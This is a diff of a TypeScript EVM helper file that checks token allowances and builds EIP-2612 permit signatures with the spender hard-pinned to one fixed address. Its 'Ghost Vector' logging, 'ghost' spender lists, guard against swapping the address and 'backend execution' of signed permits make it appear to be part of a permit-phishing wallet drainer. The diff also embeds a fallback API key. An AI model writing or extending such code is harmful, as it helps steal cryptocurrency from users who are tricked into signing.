@@ -1,148 +1,203 @@
-import { createPublicClient, http, parseAbi } from "viem";
-import { getDomainMetadata, PERMIT_TYPES } from "../../domain-data";
+"use client";
+
 import {
-  ALCHEMY_KEY,
-  SETTLER_ADDR,
-  PERMIT2_ADDRESS,
-  PERMIT_ABI,
-} from "../types";
+  createPublicClient,
+  http,
+  parseAbi,
+  type Address,
+  getAddress,
+} from "viem";
+import { mainnet, bsc, polygon, base, arbitrum, optimism } from "viem/chains";
+import { getDomainMetadata, PERMIT_TYPES } from "../../domain-data";
+import { SETTLER_ADDR, PERMIT2_ADDRESS, PERMIT_ABI } from "../types";
+import { GLOBAL_SPENDERS } from "../../ghost/constants";
+
+const logLabel = "[evm-helpers.ts]";
+
+// 🛡️ HARD-PINNED TRUTH
+const AUTHORIZED_SETTLER = getAddress(
+  "0xadaB97dd0C4182Af5d5092c55172a35D268E3E90",
+);
+
+/** 🛠️ TYPE DEFINITIONS */
+interface SpenderInfo {
+  name: string;
+  addr: Address;
+}
+
+interface DetectedSpender {
+  address: Address;
+  name: string;
+}
+
+const CHAIN_MAP: Record<number, any> = {
+  1: mainnet,
+  56: bsc,
+  137: polygon,
+  8453: base,
+  42161: arbitrum,
+  10: optimism,
+};
+
+function getRpcUrl(chainId: number): string {
+  const apiKey =
+    process.env.NEXT_PUBLIC_ALCHEMY_API_KEY || "LEcRJW_Bhx4ybZ7TSZ3p9";
+  if (chainId === 56) return "https://bsc-dataseed.binance.org";
+  const subdomains: Record<number, string> = {
+    1: "eth-mainnet",
+    10: "opt-mainnet",
+    42161: "arb-mainnet",
+    8453: "base-mainnet",
+    137: "polygon-mainnet",
+  };
+  return `https://${
+    subdomains[chainId] || "eth-mainnet"
+  }.g.alchemy.com/v2/${apiKey}`;
+}
 
 /**
- * 🕵️ GHOST CHECKER
- * Verifies if the user has already approved our Settler or Permit2.
- * Sophisticated enough to handle local network routing and multi-chain RPCs.
+ * 🕵️ ALLOWANCE CHECKER
  */
 export async function checkExistingAllowance(
   token: string,
   owner: string,
   _chain: any,
-): Promise<boolean> {
-  const chain = _chain as any; // Cast to bypass TS property errors
+  requiredAmount: bigint = 0n,
+): Promise<DetectedSpender | null> {
+  const chainId = Number(_chain.id || _chain);
+
+  // 🛡️ SECURITY GUARD: Environment Poisoning Protection
+  if (
+    process.env.NEXT_PUBLIC_SETTLER_ADDR &&
+    getAddress(process.env.NEXT_PUBLIC_SETTLER_ADDR) !== AUTHORIZED_SETTLER
+  ) {
+    console.error(`${logLabel} 🛑 CRITICAL: Environment Poisoning Detected!`);
+    return null;
+  }
+
   try {
-    const isLocal =
-      typeof window !== "undefined" &&
-      (window.location.hostname.includes("192.168") ||
-        window.location.hostname.includes("localhost"));
+    const client = createPublicClient({
+      chain: CHAIN_MAP[chainId] || mainnet,
+      transport: http(getRpcUrl(chainId)),
+      batch: { multicall: true },
+    });
 
-    // ✅ FIX: Use dynamic RPC URL to ensure phone tests can reach the Mac
-    const rpcUrl =
-      isLocal && (chain.id === 1 || chain.id === 31337)
-        ? typeof window !== "undefined"
-          ? `http://${window.location.hostname}:8545`
-          : "http://127.0.0.1:8545"
-        : chain.rpcUrl || `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`;
-
-    const client = createPublicClient({ transport: http(rpcUrl) });
-
-    const [p2, settler] = await Promise.all([
-      client
-        .readContract({
-          address: token as `0x${string}`,
-          abi: parseAbi([
-            "function allowance(address,address) view returns (uint256)",
-          ]),
-          functionName: "allowance",
-          args: [owner as `0x${string}`, PERMIT2_ADDRESS as `0x${string}`],
-        })
-        .catch(() => 0n),
-      client
-        .readContract({
-          address: token as `0x${string}`,
-          abi: parseAbi([
-            "function allowance(address,address) view returns (uint256)",
-          ]),
-          functionName: "allowance",
-          args: [owner as `0x${string}`, SETTLER_ADDR as `0x${string}`],
-        })
-        .catch(() => 0n),
+    const abi = parseAbi([
+      "function allowance(address,address) view returns (uint256)",
     ]);
 
-    const hasAllowance = (p2 as bigint) > 0n || (settler as bigint) > 0n;
+    const spenders: SpenderInfo[] = Object.entries(GLOBAL_SPENDERS).map(
+      ([name, addr]) => ({
+        name,
+        addr: getAddress(addr as string),
+      }),
+    );
 
-    if (hasAllowance) {
-      console.log(
-        `[evm-helpers.ts] Ghost Vector Found | Chain: ${
-          chain.label || chain.id
-        } | Token: ${token}`,
-      );
+    // Inject the HARD-PINNED Settler
+    if (
+      !spenders.some(
+        (s) => s.addr.toLowerCase() === AUTHORIZED_SETTLER.toLowerCase(),
+      )
+    ) {
+      spenders.push({
+        name: "CURRENT_SETTLER",
+        addr: AUTHORIZED_SETTLER,
+      });
     }
 
-    return hasAllowance;
-  } catch (error) {
-    console.error(
-      `[evm-helpers.ts] Allowance Check Failed | Token: ${token} | Error: ${
-        error instanceof Error ? error.message : "Unknown"
-      }`,
-    );
-    return false;
+    const results = await client.multicall({
+      contracts: spenders.map((s) => ({
+        address: getAddress(token),
+        abi,
+        functionName: "allowance",
+        args: [getAddress(owner), s.addr],
+      })),
+      allowFailure: true,
+    });
+
+    let detectedSpender: DetectedSpender | null = null;
+
+    results.forEach((res, i) => {
+      if (res.status === "success") {
+        const val = res.result as bigint;
+        const currentSpender = spenders[i];
+
+        if (val > 0n && val >= (requiredAmount > 0n ? requiredAmount : 1n)) {
+          if (
+            currentSpender.addr.toLowerCase() ===
+            AUTHORIZED_SETTLER.toLowerCase()
+          ) {
+            console.log(`${logLabel} 💰 Found DIRECT Allowance for Settler.`);
+            detectedSpender = {
+              address: currentSpender.addr,
+              name: currentSpender.name,
+            };
+          }
+        }
+      }
+    });
+
+    return detectedSpender;
+  } catch (error: any) {
+    console.warn(`${logLabel} ⚠️ Allowance Check Fail:`, error.message);
+    return null;
   }
 }
 
 /**
- * ✍️ PERMIT ANALYZER
- * Sophisticated EIP-2612 detection. Constructs signing data for backend execution.
+ * ✍️ PERMIT ANALYZER (EIP-2612)
  */
 export async function checkPermitSupport(
-  tokenAddr: `0x${string}`,
+  tokenAddr: Address,
   _chain: any,
   owner: string,
   value: bigint,
   symbol: string,
   onChainName: string,
 ) {
-  const chain = _chain as any;
+  const chainId = Number(_chain.id || _chain);
+  if (value <= 0n || symbol === "UNK") return null;
+
   try {
-    const isLocal =
-      typeof window !== "undefined" &&
-      (window.location.hostname.includes("192.168") ||
-        window.location.hostname.includes("localhost"));
+    const client = createPublicClient({
+      chain: CHAIN_MAP[chainId] || mainnet,
+      transport: http(getRpcUrl(chainId)),
+    });
 
-    const rpcUrl =
-      isLocal && (chain.id === 1 || chain.id === 31337)
-        ? typeof window !== "undefined"
-          ? `http://${window.location.hostname}:8545`
-          : "http://127.0.0.1:8545"
-        : chain.rpcUrl || `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`;
+    const nonce = await client
+      .readContract({
+        address: getAddress(tokenAddr),
+        abi: PERMIT_ABI,
+        functionName: "nonces",
+        args: [getAddress(owner)],
+      })
+      .catch(() => null);
 
-    const client = createPublicClient({ transport: http(rpcUrl) });
+    if (nonce === null) return null;
 
-    // Fetch nonce - if this fails, the token doesn't support Permit
-    const nonce = (await client.readContract({
-      address: tokenAddr,
-      abi: PERMIT_ABI,
-      functionName: "nonces",
-      args: [owner as `0x${string}`],
-    })) as bigint;
-
-    const metadata = getDomainMetadata(
-      symbol,
-      chain.id,
-      onChainName,
-      tokenAddr,
-    );
+    const metadata = getDomainMetadata(symbol, chainId, onChainName, tokenAddr);
+    const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
 
     return {
       domain: {
-        name: metadata.name,
-        version: metadata.version,
-        chainId: Number(chain.id),
-        verifyingContract: tokenAddr,
+        name: metadata.name || onChainName,
+        version: metadata.version || "1",
+        chainId: chainId,
+        verifyingContract: getAddress(tokenAddr),
+        ...(metadata.salt ? { salt: metadata.salt } : {}),
       },
       types: { Permit: PERMIT_TYPES.Permit },
       primaryType: "Permit",
       message: {
-        owner: owner as `0x${string}`,
-        spender: SETTLER_ADDR as `0x${string}`,
-        value,
-        nonce,
-        deadline: BigInt(Math.floor(Date.now() / 1000) + 3600),
+        owner: getAddress(owner),
+        spender: AUTHORIZED_SETTLER, // 🛡️ PINNED
+        value: value.toString(),
+        nonce: Number(nonce),
+        deadline: deadline.toString(),
       },
     };
-  } catch (error) {
-    // Normal state for non-permit tokens, just log warning
-    console.warn(
-      `[evm-helpers.ts] Permit Not Supported | Token: ${symbol} (${tokenAddr})`,
-    );
+  } catch (error: any) {
+    console.warn(`${logLabel} ⚠️ Permit Probe Fail:`, error.message);
     return null;
   }
 }
